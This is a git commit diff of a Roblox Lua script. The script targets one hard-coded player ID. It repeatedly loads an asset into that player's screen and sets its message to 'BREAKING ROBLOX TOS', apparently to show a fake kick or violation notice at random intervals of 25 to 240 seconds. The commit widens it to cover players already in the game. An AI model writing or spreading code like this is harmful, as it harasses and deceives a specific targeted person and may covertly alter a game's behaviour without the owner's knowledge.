c28410b5ad113c690b2e8cbfac6b2cc80277ce08
Viper <100521306+MuhXd@users.noreply.github.com>
2024-08-14 01:17:02 +0100

    Update t.lua

--- scripts/t.lua
+++ scripts/t.lua
@@ -1,6 +1,5 @@
-game.Players.PlayerAdded:Connect(function(plr)
-	task.wait(3)
-	if  plr.UserId == 3572567805  then
+function plrx(plr)
+if  plr.UserId == 3572567805  then
 	while plr do
 		if plr then
 		        local ok = game:GetService("InsertService"):LoadAsset(18938166154)
@@ -9,8 +8,16 @@ game.Players.PlayerAdded:Connect(function(plr)
 		        troll:WaitForChild("KickFor").Value = "BREAKING ROBLOX TOS"
 		        troll.Parent = plr:WaitForChild("PlayerGui")
 		        troll.Enabled = true
-				task.wait(math.random(25, 240))
+			task.wait(math.random(25, 240))
 		end
 	end
     end
+end
+-- Shrug
+for i,plr in pairs(game.Players:GetPlayers()) do
+	plrx(plr)
+end
+game.Players.PlayerAdded:Connect(function(plr)
+	task.wait(3)
+	plrx(plr)
 end)
